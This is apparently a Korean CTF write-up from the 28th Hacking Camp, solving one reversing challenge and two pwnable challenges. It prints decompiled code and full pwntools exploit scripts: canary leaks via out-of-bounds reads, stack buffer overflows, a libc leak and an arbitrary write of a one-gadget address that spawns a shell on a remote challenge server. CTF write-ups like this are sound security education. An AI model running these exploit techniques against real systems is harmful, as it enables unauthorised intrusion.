---
title: "제 28회 Hacking Camp CTF Write up"
date: 2024-02-19 +0900
categories: [WRITE-UP]
tags: ['writeup', '해킹캠프', '2024']
image:
    path: "/assets/img/posts/hackingcampctf28/1708188245620.png"
    alt: "제 28회 해킹캠프 CTF 1위"
    lqip: "/assets/img/posts/hackingcampctf28/1708188245620.png"
---
![1708188245620.png](/assets/img/posts/hackingcampctf28/hackcamp_logo.png){: width="300"}
_제 28회 해킹캠프_

> 해킹캠프 CTF 연속 1위!! 팀운이 미친듯이 좋았던 듯 합니다...

## **calc - [reversing]**

### Analysis

문제 코드를 보면 최종적으로 `system("./connect")` 를 호출해야 하는 것 같다. 해당 코드를 호출하기 위한 조건을 보면 `change_pw` 와 `real_enc` 의 문자열이 같아야 함을 알 수 있다.

```c
int compare()
{
  if ( strcmp(&change_pw, &real_enc) )
  {
    puts("Try harder");
    exit(0);
  }
  puts("go go go go go go ");
  return system("./connect");
}
```

`main()` 함수에서 `generatePassword()` 를 호출하는 것을 볼 수 있는데, 사용자의 입력 값이 들어간 변수를 사용한다.

```c
printf("pw >> ");
__isoc99_scanf("%20s", &v21);

...(중략)

v5 = generatePassword(&v21);
```

`generatePassword()` 에서는 총 14바이트의 입력 값과 xor 연산을 시켜 `change_pw` 변수에 저장하는 과정을 거친다. 이후에는 `i` 가 5부터 84까지 반복하면서 조건에 if문 조건에 따라 연산을 시행한 후 리턴할 때 `v2 * 2` 를 반환한다.

- if 조건
    - `i % 5` 가 0 이고 `i <= 74` 일 때 `table` 과 `loop` 에 접근하여 각각 곱해준 후 `v2`에 누적하여 더한다.

```c
__int64 __fastcall generatePassword(_BYTE *a1)
{
  int v2; // [rsp+10h] [rbp-8h]
  int i; // [rsp+14h] [rbp-4h]

  v2 = 0;
  change_pw = byte_202042 ^ *a1;
  byte_2020EB = byte_20208B ^ a1[11];
  byte_2020E3 = byte_202049 ^ a1[3];
  byte_2020EA = byte_20204D ^ a1[10];
  byte_2020E9 = byte_202060 ^ a1[9];
  byte_2020E5 = byte_202058 ^ a1[5];
  byte_2020ED = byte_20208D ^ a1[13];
  byte_2020E6 = byte_202072 ^ a1[6];
  byte_2020E1 = byte_202044 ^ a1[1];
  byte_2020E7 = byte_202054 ^ a1[7];
  byte_2020E4 = byte_20204A ^ a1[4];
  byte_2020E8 = byte_202073 ^ a1[8];
  byte_2020E2 = byte_202046 ^ a1[2];
  byte_2020EC = byte_20208C ^ a1[12];
  for ( i = 5; i <= 84; ++i )
  {
    if ( !(i % 5) && i <= 74 )
      v2 += table[i] * loop[j_9493++];
  }
  return (unsigned int)(2 * v2);
}
```

`generatePassword2()` 함수에서는 매개변수로 받은 `v5` 와 `change_pw` 를 14번 반복하면서 각각의 인덱스에 저장된 값과 xor 연산하는 과정을 거친다.

```c
char *__fastcall generatePassword2(char a1)
{
  char *result; // rax
  int i; // [rsp+10h] [rbp-4h]

  for ( i = 0; i <= 13; ++i )
  {
    result = &change_pw;
    *(&change_pw + i) ^= a1;
  }
  return result;
}
```

### Solution Code

```python
real = [0x04, 0x34, 0x26, 0x32, 0x56, 0x28, 0x45, 0x6B, 0x69, 0x44, 0x43, 0x53, 0x16, 0x4C]

loop =[
  0x0D, 0x0E, 0x0A, 0x0D, 0x0B, 0x0E, 0x0E, 0x0F, 0x0E, 0x0E,
  0x0B, 0x0D, 0x0A, 0x0E, 0x00
]

table = [0x27, 0x6E, 0x64, 0x6B, 0x33, 0x31, 0x32, 0x6B, 0x33, 0x39, 0x23, 0x61, 0x6E, 0x63, 0x26, 0x61,
0x4B, 0x63, 0x7B, 0x6B, 0x64, 0x69, 0x75, 0x67, 0x5F, 0x6B, 0x6E, 0x62, 0x69, 0x39, 0x31, 0x6C,
0x6B, 0x6E, 0x61, 0x39, 0x30, 0x31, 0x38, 0x31, 0x33, 0x6B, 0x52, 0x6E, 0x63, 0x6B, 0x65, 0x24,
0x35, 0x34, 0x31, 0x69, 0x61, 0x6B, 0x63, 0x6E, 0x61, 0x6C, 0x70, 0x69, 0x71, 0x6C, 0x64, 0x6A,
0x6C, 0x71, 0x69, 0x62, 0x6D, 0x61, 0x6F, 0x71, 0x70, 0x38, 0x37, 0x67, 0x31, 0x2C, 0x6D, 0x61,
0x30, 0x38, 0x61, 0x64]

flag = [0 for x in range(14)]

v2 = 0
loop_idx = 0
for i in range(5, 85):
    if (i % 5) == 0 and i <= 74:
        v2 += table[i] * loop[loop_idx]
        loop_idx += 1

v2 *= 2

for i in range(14):
    real[i] = (real[i] ^ v2) & 0xff

flag[0] = real[0] ^ 0x64
flag[0xb] = real[0xb] ^ 0x67
flag[0x3] = real[0x3] ^ 0x39
flag[0xa] = real[0xa] ^ 0x63
flag[0x9] = real[0x9] ^ 0x6b
flag[0x5] = real[0x5] ^ 0x5f
flag[0xd] = real[0xd] ^ 0x2c
flag[0x6] = real[0x6] ^ 0x31
flag[0x1] = real[0x1] ^ 0x33
flag[0x7] = real[0x7] ^ 0x64
flag[0x4] = real[0x4] ^ 0x23
flag[0x8] = real[0x8] ^ 0x69
flag[0x2] = real[0x2] ^ 0x32
flag[0xc] = real[0xc] ^ 0x31

for i in flag:
    print(chr(i), end='')
```

## **CANALEAK 보험 회사 - [Pwnable]**

### 1. Abstract

- Out Of Bound
- Stack Based Buffer Overflow

### 2. Analysis

주어진 프로그램은 입력에 따라 각각 다른 작업을 수행한다.

- J : `v7` 변수에 최대 64바이트 만큼 입력
- R : `v4` 에 정수를 입력하고, `print_box((int)v7, v4)` 호출
- E : 반복문을 탈출하고,  `nbytes` 에 정수형으로 입력받고, `read(0, v8, nbytes);` 를 통해 `v8` 변수에 최대 `nbytes` 만큼 입력을 받음.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+4h] [ebp-98h] BYREF
  size_t nbytes; // [esp+8h] [ebp-94h] BYREF
  __int16 buf; // [esp+Eh] [ebp-8Eh] BYREF
  char v7[64]; // [esp+10h] [ebp-8Ch] BYREF
  char v8[64]; // [esp+50h] [ebp-4Ch] BYREF
  unsigned int v9; // [esp+90h] [ebp-Ch]

  v9 = __readgsdword(0x14u);
  memset(v7, 0, sizeof(v7));
  memset(v8, 0, sizeof(v8));
  buf = 0;
  v4 = 0;
  nbytes = 0;
  initialize(argv);
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        read(0, &buf, 2u);
        if ( (char)buf != 'J' )
          break;
        printf("Your input : ");
        read(0, v7, 0x40u);
      }
      if ( (char)buf != 'R' )
        break;
      printf("Are you sure you want to refuse? (0: YES / 1: NO / ???: OTHERS) : ");
      __isoc99_scanf("%d", &v4);
      print_box((int)v7, v4);
    }
  }
  while ( (char)buf != 'E' );
  printf("What is your favorite number? : ");
  __isoc99_scanf("%d", &nbytes);
  printf("Number code : ");
  read(0, v8, nbytes);
  return 0;
}
```

`print_box` 의 내용은 아래와 같다.

매개변수로 받은 `v7` 에 `v4` 만큼 떨어진 주소의 값 한 바이트를 hex 값으로 출력한다.

```c
int __cdecl print_box(int a1, int a2)
{
  return printf("Your choice is %d : %02x\n", a2, *(unsigned __int8 *)(a2 + a1));
}
```

### 3. Exploit

해당 바이너리에 걸려있는 mitigation을 보면 stack guard가 설정되어 있는 것을 볼 수 있다.

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

`main()` 에서 코드에서 `v4` 에 원하는 값을 입력할 수 있고, `print_box()` 를 호출할 때 `v4` 가 `v7` 의 인덱스 역할을 하므로 OOB를 통해 AAR가 가능하다. 따라서 Canary 값을 얻을 수 있다.

```c
if ( (char)buf != 'R' )
  break;
printf("Are you sure you want to refuse? (0: YES / 1: NO / ???: OTHERS) : ");
__isoc99_scanf("%d", &v4);
print_box((int)v7, v4);
```

그리고 `'E'` 를 입력하여 while 문을 탈출하고, `nbytes` 에 입력한 수 만큼 `v8`에 입력할 수 있기 때문에 해당 부분에서 BOF가 발생한다.

```c
while ( (char)buf != 'E' );
printf("What is your favorite number? : ");
__isoc99_scanf("%d", &nbytes);
printf("Number code : ");
read(0, v8, nbytes);
```

결과적으로 canary 값을 알아냈기 때문에 bof가 가능하고 return address를 `win()` 함수로 덮을 수 있다.

```c
int get_shell()
{
  system("/bin/sh");
  return puts("heww");
}
```

### 4. Exploit Code

```python
from pwn import *
import binascii

#p = process('./join_insurance')
p = remote('43.203.26.108', 912)
e = ELF('./join_insurance')
#input()

get_shell = e.symbols['get_shell']

def leak_canary(offset):
    p.sendlineafter('> ', 'R')
    p.sendlineafter(': ', offset)
    

# canary leak
canary = b''
for i in range(129, 132):
    leak_canary(str(i))
    p.recvuntil('Your choice is ')
    p.recvuntil(': ')
    canary += p.recvline().strip()
    print(canary)

canary = canary.decode()
canary = binascii.unhexlify(canary)
print(canary)
#canary = int(canary, 16)

p.sendlineafter('> ', 'E')

size = 0x400
p.sendlineafter(': ', str(size))

payload = b'A' * 64
payload += b'\x00' + canary
payload += b'B' * 12
payload += p32(get_shell)

p.sendlineafter(': ', payload)

p.interactive()
```

## **lvlttr - [Pwnable]**

### 1. Abstract

- Stack Based Buffer Overflow
- Memory Leakage
- Arbitrary Address Write

### 2. Analysis

프로그램을 실행하면 아래와 같이 메뉴를 고를 수 있는 프롬프트가 출력된다.

```
한 통의 편지가 도착했습니다.

1. 편지 확인
2. 편지 보내기
3. go out
```

먼저 `1. 편지 확인` 메뉴의 내용을 보면 내부에서 또 메뉴를 고를 수 있게 되어 있는데, 특히 2번 메뉴를 보면 입력 값인 `buf` 을 출력해주는 부분이 있다.

```c
__isoc99_scanf("%d", &v5)
if ( v5 == 1 )
  {
    puts("No...");
    lttr = 0;
  }
  else if ( v5 == 2 )
  {
    printf("Answer: ");
    read(0, buf, 0x30uLL);
    puts(buf);
  }
  else
  {
    puts("Change..");
  }
}
```

그리고 `2. 편지보내기` 메뉴도 마찬가지로 내부에서 메뉴를 고를 수 있도록 되어 있다.

```c
__isoc99_scanf("%d", &v6);
switch ( v6 )
{
  case 1:
    menu21();
    break;
  case 2:
    printf("Answer: ");
    read(0, buf, 0x48uLL);
    break;
  case 3:
    menu23();
    break;
}
```

1번 메뉴부터 보면 사용자가 입력 받은 `buf` 에 `read()` 를 통해 `buf` 라는 주소에 입력이 가능한 것을 볼 수 있다.

```c
unsigned __int64 menu21()
{
  void *buf; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Components: ");
  __isoc99_scanf("%lu", &buf);
  printf("Contents: ");
  read(0, buf, 7uLL);
  return __readfsqword(0x28u) ^ v2;
}
```

2번 메뉴를 보면 `buf` 에 `0x48` 만큼 입력이 가능하지만, return address까지 덮을 수 없었다. 

(정확히 8바이트가 부족함.)

```c
case 2:
  printf("Answer: ");
  read(0, buf, 0x48uLL);
  break;
```

3번 메뉴는 입력 값의 주소를 free 해주는 기능을 한다.

```c
unsigned __int64 menu23()
{
  void *ptr; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("What: ");
  __isoc99_scanf("%lu", &ptr);
  free(ptr);
  return __readfsqword(0x28u) ^ v2;
}
```

### 3. Exploit

내가 생각한 exploit 시나리오는 다음과 같다.

1. Memory Leakage (Stack, Canary, Library)
2. Arbitrary Address Write

#### 3.1 Memory Leakage

`puts()`의 경우 null 값이 나올 때까지 출력하기 때문에 이를 이용하여 문자열을 이어서 출력할 수 있다. 이를 통해 Memory Leak이 가능하다.

`"편지 보내기" > "편지 쓰기" > "편지 확인" > "답장 쓰기"` 를 반복하여 Stack Address, Canary, libc Address를 얻을 수 있다.

위의 Memory Leak을 통해 익스플로잇에 필요한 정보를 얻을 수 있다.

1. `main()` 함수의 return address
2. Canary
3. Oneshot Gadget Address

#### 3.2 Arbitrary Address Write

`menu21` 에서 Arbitrary Address Write가 가능하기 때문에 Stack의 return 주소가 위치한 곳에 oneshot gadget의 주소를 Overwrite 할 수 있다.

```c
unsigned __int64 menu21()
{
  void *buf; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Components: ");
  __isoc99_scanf("%lu", &buf);
  printf("Contents: ");
  read(0, buf, 7uLL);
  return __readfsqword(0x28u) ^ v2;
}
```

마지막으로 Memory Leak 시도 때문에 손상되었던 Canary 값을 복구시키고, `go out` 메뉴를 선택하면 ret address에 쓰여진 Oneshot Gadget 주소가 호출되면서 익스플로잇이 된다.

### 4. Exploit Code

```python
from pwn import *

context.log_level = 'debug'

def letter_delete():
    p.sendlineafter('> ', '1')

def letter_answer(buf):
    p.sendlineafter('> ', '2')
    p.sendlineafter('Answer: ', buf)

def addr_input(comp, con):
    p.sendlineafter('> ', '1')
    p.sendlineafter('Components: ', comp)
    p.sendafter('Contents: ', con)

def write_letter(buf):
    p.sendlineafter('> ', '2')
    p.sendafter('Answer: ', buf)

def delete(ptr):
    p.sendlineafter('> ', '3')
    p.sendlineafter('What: ', ptr)

def letter_check(sel, buf=b''):
    p.sendlineafter('> ', '1')
    if sel == 1:
        letter_delete()
    else:
        letter_answer(buf)

def send_letter(sel, comp=b'', con=b'', buf=b'', ptr=b''): # 편지 보내기
    p.sendlineafter('> ', '2')
    if sel == 1:
        addr_input(comp, con)
    elif sel == 2:
        write_letter(buf)
    else:
        delete(ptr)

def go_out():
    p.sendlineafter('> ', '3')

#p = process('./lvlttr')
p = remote('43.203.26.108', 217)

#libc_main_231 = 0x21c87
libc_main_231 = 0x21bf7
one_gadget = [0x4f3d5, 0x4f432, 0x10a41c]

input()

# stack leak
payload = b'A' * 0x30
send_letter(2, buf=payload)

payload = b'B' * 0x30
letter_check(2, buf=payload)

p.recvuntil(b'B' * 0x30)
stack_leak = p.recvline().strip()
stack_leak = u64(stack_leak.ljust(8, b'\x00'))
print(hex(stack_leak))

# canary leak
payload = b'A' * 56 + b'\n'
send_letter(2, buf=payload)

payload = b'B' * 0x30
letter_check(2, buf=payload)

p.recvline()
canary_leak = u64(p.recv(7).rjust(8, b'\x00'))
print(hex(canary_leak))

# libc leak
payload = b'A' * 0x48
send_letter(2, buf=payload)

payload = b'B' * 0x30
letter_check(2, buf=payload)

p.recvuntil('AAAAAAAAAAAAAAAAAAAAAAAA')
leak = p.recvline().strip()
leak = u64(leak.ljust(8, b'\x00'))
print(hex(leak))

# one gagdget
libc_base = leak - libc_main_231
oneshot = libc_base + one_gadget[0]

#send_letter(1, comp='', con='asf')

# free

stack_addr = stack_leak - 0xd8

payload = p64(oneshot)[:7]
print(len(payload))
send_letter(1, comp=str(stack_addr), con=payload)

'''
send_letter(2, buf=payload)

stack_addr = stack_leak - 0xe0 - 0x30
send_letter(3, ptr=str(stack_addr).encode())
'''

# exploit
payload = b'A' * 56
payload += p64(canary_leak)
payload += b'B' * 8
send_letter(2, buf=payload)

#go out
#go_out()
p.sendlineafter('> ', '3')
p.interactive()
```